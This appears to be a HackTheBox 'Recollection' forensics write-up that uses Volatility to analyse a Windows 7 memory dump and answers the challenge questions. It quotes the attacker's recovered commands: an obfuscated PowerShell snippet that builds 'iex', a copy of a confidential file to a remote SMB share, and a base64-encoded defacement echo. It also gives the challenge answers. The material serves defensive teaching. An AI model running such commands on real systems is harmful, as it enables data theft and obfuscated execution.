---
Title: "HTB: Recollection"
date: 2025-05-31
tags: [windows, volatility]
Draft: False
---

## 1. Scenario Introduction

A junior member of our security team was conducting research and testing on an operating system that appeared to be old and insecure. We believe the system may have been compromised and have obtained a memory dump of the asset. We want to determine what actions the attacker took and if other assets within our environment were affected. Please answer the questions below.

#### 1-1. Related Technologies
- Windows Memory Analysis
- Volatility

## 2. Background Knowledge

### 2-1. Volatility
- **Volatility** is an open-source forensics tool for analyzing memory dump (.bin) files.
- Key versions:
    - `Volatility 2.x`: Based on Python 2, many plugins, requires `--profile`.
    - `Volatility 3.x`: Based on Python 3, restructured, auto-detects `profile`.

##### 2-1-1. Identifying Operating System Information
Volatility 2:
```
volatility -f [dump.bin] imageinfo
```
Volatility 3:
```
vol -f [dump.bin] windows.info
```

##### 2-1-2. Checking Commands/Scripts (Volatility 2)
**clipboard**
- Checks the last text stored in the **clipboard**.
- Can reveal **PowerShell code** pasted by an attacker.
```
volatility --profile=[profile] -f [dump] clipboard
```

**cmdscan / consoles**
- `cmdscan`: Command history for cmd or powershell (in memory).
- `consoles`: Allows viewing the actual terminal output (stdout + stderr).
```
volatility --profile=[profile] -f [dump] cmdscan
volatility --profile=[profile] -f [dump] consoles
```

##### 2-1-3. File-Related Analysis (Volatility 2)
**filescan**
- Scans all **file objects** present in memory.
```
volatility --profile=[profile] -f [dump] filescan
```

**file extraction**
- Files can be extracted with `dumpfiles`.
```
volatility --profile=[profile] -f [dump] dumpfiles -Q [Offset] -D [OutputDir]
```

##### 2-1-4. Network Analysis (Volatility 2)
**netscan**
- Checks for open ports/connected IPs in memory.
- Analyzes **local IP, external C2 connections, data exfiltration**, etc.
```
volatility --profile=[profile] -f [dump] netscan
```

##### 2-1-5. Process-Related
| Plugin    | Function                                    |
| --------- | ------------------------------------------- |
| `pslist`  | List of running processes                   |
| `psscan`  | Full scan including hidden processes        |
| `pstree`  | View parent-child relationships in a tree   |
| `dlllist` | Check loaded DLLs                           |
| `cmdline` | Check the full command line parameters at execution time |

## 3. Analysis

### 3-1. Download Evidence File
1. Open the link below in a browser to download the file, or find `recollection.zip` in the study materials and move it to your analysis OS: [filename](link)
2. Use `7z` to extract the archive. The password is `hacktheblue`.

### 3-2. Initial Analysis
#### 3-2-1. Identify Operating System

```powershell
PS C:\Users\bokchee\Desktop\analysis > vol -f .\recollection.bin windows.info

...

Kernel Base     0xf8000285c000
DTB     0x187000
Symbols file:///C:/Python310/Lib/site-packages/volatility3/symbols/windows/ntkrnlmp.pdb/DADDB88936DE450292977378F364B110-1.json.xz
Is64Bit True
IsPAE   False
layer_name      0 WindowsIntel32e
memory_layer    1 FileLayer
KdDebuggerDataBlock     0xf80002a3f120
NTBuildLab      7601.24214.amd64fre.win7sp1_ldr_
CSDVersion      1
KdVersionBlock  0xf80002a3f0e8
Major/Minor     15.7601
MachineType     34404
KeNumberProcessors      1
SystemTime      2022-12-19 16:07:30+00:00
NtSystemRoot    C:\Windows
NtProductType   NtProductWinNt
NtMajorVersion  6
NtMinorVersion  1
PE MajorOperatingSystemVersion  6
PE MinorOperatingSystemVersion  1
PE Machine      34404
PE TimeDateStamp        Thu Aug  2 02:18:10 2018
```

Volatility 2 output:

```powershell
C:\Users\bokchee\Desktop\Tools\volatility_2.6_win64_standalone>.\volatility_2.6_win64_standalone.exe -f C:\Users\bokchee\Desktop\analysis\recollection.bin imageinfo
Volatility Foundation Volatility Framework 2.6
INFO    : volatility.debug    : Determining profile based on KDBG search...
          Suggested Profile(s) : Win7SP1x64, Win7SP0x64, Win2008R2SP0x64, Win2008R2SP1x64_23418, Win2008R2SP1x64, Win7SP1x64_23418
                     AS Layer1 : WindowsAMD64PagedMemory (Kernel AS)
                     AS Layer2 : FileAddressSpace (C:\Users\bokchee\Desktop\analysis\recollection.bin)
                      PAE type : No PAE
                           DTB : 0x187000L
                          KDBG : 0xf80002a3f120L
          Number of Processors : 1
     Image Type (Service Pack) : 1
                KPCR for CPU 0 : 0xfffff80002a41000L
             KUSER_SHARED_DATA : 0xfffff78000000000L
           Image date and time : 2022-12-19 16:07:30 UTC+0000
     Image local date and time : 2022-12-19 22:07:30 +0600
```

### 3-3. Problem Solving
#### Q1. What is the operating system?

Check `NTBuildLab` in the `windows.info` output: Windows 7

#### Q2. What time was the dump created?

Check `SystemTime` in the `windows.info` output: 2022-12-19 16:07:30

#### Q3. After gaining access to the machine, the attacker pasted an obfuscated PowerShell command. What was that command?

Focusing on "pasted," let's examine the clipboard.

```powershell
C:\Users\bokchee\Desktop\Tools\volatility_2.6_win64_standalone>.\volatility_2.6_win64_standalone.exe -f C:\Users\bokchee\Desktop\analysis\recollection.bin --profile Win7SP1x64 clipboard
Volatility Foundation Volatility Framework 2.6
Session    WindowStation Format                         Handle Object             Data
---------- ------------- ------------------ ------------------ ------------------ --------------------------------------------------
         1 WinSta0       CF_UNICODETEXT               0x6b010d 0xfffff900c1bef100 (gv '*MDR*').naMe[3,11,2]-joIN''
         1 WinSta0       CF_TEXT                  0x7400000000 ------------------
         1 WinSta0       CF_LOCALE                    0x7d02bd 0xfffff900c209a260
         1 WinSta0       0x0L                              0x0 ------------------
```

The first one is the command `(gv '*MDR*').naMe[3,11,2]-joIN''`.

#### Q4. The attacker executed the obfuscated command in PowerShell to obtain a specific alias. What is this command?

Let's analyze the command `(gv '*MDR*').naMe[3,11,2]-joIN''`.

`(gv '*MDR*')`
- `gv` is short for `Get-Variable`.
- `'*MDR*'` is a wildcard pattern that searches for variables whose names contain `MDR`.
- As a result, this code accesses a PowerShell variable named `*MDR`.

`.naME[3,11,2]`
- Although slightly obfuscated, it basically refers to the `.name` property of the variable.
- It then indexes and retrieves specific characters at `[3,11,2]`.

`-join ''`
- This is how to join an array into a string in PowerShell.
- It combines the characters of the array without any spaces.

So, overall, this command extracts the 3rd, 11th, and 2nd characters from the name property of the `*MDR*` variable and joins them into a string.

Let's actually input this command into a PowerShell session to see the result.

```powershell
PS C:\Users\bokchee\Desktop\analysis > gv '*MDR*'

Name                           Value
----                           -----
MaximumDriveCount              4096



PS C:\Users\bokchee\Desktop\analysis > (gv '*MDR*').naMe[3,11,2]-joIN''
iex
```

This command extracts `iex` from the value `MaximumDriveCount`.

`iex` is short for `Invoke-Expression`, a feature in PowerShell that executes code from a string. It is often used to execute additional payloads or downloads.

#### Q5. What command was attempted for data exfiltration?

We can see the executed commands using Volatility2's cmdscan.

```powershell
C:\Users\bokchee\Desktop\Tools\volatility_2.6_win64_standalone>.\volatility_2.6_win64_standalone.exe -f C:\Users\bokchee\Desktop\analysis\recollection.bin --profile Win7SP1x64 cmdscan
... (output omitted for brevity)
```

After the previously identified command, several PowerShell commands were executed with obfuscated payloads.
Let's decode the commands and list them in chronological order.

```powershell
powershell -command "(gv '*MDR*').naMe[3,11,2]-joIN''"

---

type C:\Users\Public\Secret\Confidential.txt > \\192.168.0.171\pulice\pass.txt

---

powershell -e "ZWNobyAiaGFja2VkIGJ5IG1hZmlhIiA+ICJDOlxVc2Vyc1xQdWJsaWNcT2ZmaWNlXHJlYWRtZS50eHQi"
(echo "hacked by mafia" > "C:\Users\Public\Office\readme.txt")

---

cd .\Downloads

---

ls

---

.\b0ad704122d9cffddd57ec92991a1e99fc1ac02d5b4d8fd31720978c02635cb1.exe

---

net users

---

powershell -e "ZWNobyAiaGFja2VkIGJ5IG1hZmlhIiA+ICJDOlxVc2Vyc1xQdWJsaWNcT2ZmaWNlXHJlYWRtZS50eHQi"
(echo "hacked by mafia" > "C:\Users\Public\Office\readme.txt")

---

(gv '*MDR*').naMe[3,11,2]-joIN''
```

The command used for data exfiltration is `type C:\Users\Public\Secret\Confidential.txt > \\192.168.0.171\pulice\pass.txt`.

#### Q6. Was the command executed above successful?

Using the `consoles` module, we can check the console input/output.

```powershell
... (output omitted for brevity)
PS C:\Users\user> type C:\Users\Public\Secret\Confidential.txt > \\192.168.0.171
\pulice\pass.txt
The network path was not found.
```

Therefore, the command "failed".

#### Q7. The attacker tried to create a README file. What is its path?

This can be confirmed from the list of commands: `C:\Users\Public\Office\readme.txt`

#### Q8. What is the hostname of the machine?

This is included in the output of the `net users` command from the `consoles` module output.

```powershell
PS C:\Users\user> net users

User accounts for \USER-PC
...
```

USER-PC

#### Q9. How many user accounts are on the machine?

3

#### Q10. There is a file named `passwords.txt` in a subfolder of the path `\Device\HarddiskVolume2\Users\user\AppData\Local\Microsoft\Edge`. What is its full path?

Use the `filescan` module to extract the file list.

```powershell
... filescan.txt
```

Then search for the string `passwords.txt`.

![[recollection_1.png]]

The full path of the file is: `\Device\HarddiskVolume2\Users\user\AppData\Local\Microsoft\Edge\User Data\ZxcvbnData\3.0.0.0\passwords.txt`

#### Q11. There are traces of a malicious executable being run. The name of the EXE file is a hash value. What is that hash value?

```
PS C:\Users\user\Downloads> .\b0ad704122d9cffddd57ec92991a1e99fc1ac02d5b4d8fd317
20978c02635cb1.exe
```

-> b0ad704122d9cffddd57ec92991a1e99fc1ac02d5b4d8fd31720978c02635cb1

#### Q12. What is the Imphash of the malicious executable?

Searching for the hash value on VirusTotal reveals that the executable is malicious.

![[recollection_2.png]]

The Imphash can be found in the Details tab: d3b592cd9481e4f053b5362e22d61595

#### Q13. When was the malicious file found above created?

![[recollection_3.png]]

Creation time according to VirusTotal: 2022-06-22 11:49:04

#### Q14. What is the local IP of the machine?

`netscan` results:

```powershell
... (output omitted for brevity)
```

Local IP: 192.168.0.104

#### Q15. There are several PowerShell processes, but they all have one parent process. What is it?

Find `powershell.exe` in the `pstree` module output.

```
... (output omitted for brevity)
. 0xfffffa8003cbc060:cmd.exe                         4052   2032      1     23 2022-12-19 15:40:08 UTC+0000
.. 0xfffffa8005abbb00:powershell.exe                 3532   4052      5    606 2022-12-19 15:44:44 UTC+0000
. 0xfffffa8003d6b060:powershell.exe                  3688   2032      5    367 2022-12-19 15:43:39 UTC+0000
```

Parent process: cmd.exe

#### Q16. The attacker used an email address to log into social media. What is that address?

Focusing on the word "mafia" left in the attacker's message, we search for it.

```powershell
PS C:\Users\user\Downloads> strings .\recollection.bin | Select-String "mafia"
...
emailmafia_code1337@gmail.com
...
```

We can find the email address: `mafia_code1337@gmail.com`

#### Q17. The user tried to find a SIEM solution through the MS Edge browser. What is the name of that solution?

Browser search history is stored in a DB format within the browser's History file. Let's explore it.

```
0x000000011e0d16f0     17      1 RW-rw- \Device\HarddiskVolume2\Users\user\AppData\Local\Microsoft\Edge\User Data\Default\History
```

This can be confirmed from the previously extracted `filescan` results.

We dump the file with the found offset.

```powershell
... dumpfiles -Q 0x000000011e0d16f0 ...
```

We open the extracted file in sqlitebrowser.

The `urls` table shows the visited sites.

![[recollection_4.png]]

The SIEM the user tried to download: **wazuh**

#### Q18. The victim user downloaded an exe file. The file has a name similar to a legitimate file that can be downloaded from Microsoft. What is that file?

Since no useful files were found in the browser DB, we go back to the `filescan` results and look for files in the "Downloads" path.

```
...
0x000000011e955820     16      0 -W-r-- \Device\HarddiskVolume2\Users\user\Downloads\csrsss.exe
...
```

`csrsss.exe` is likely a file mimicking `csrss.exe`.
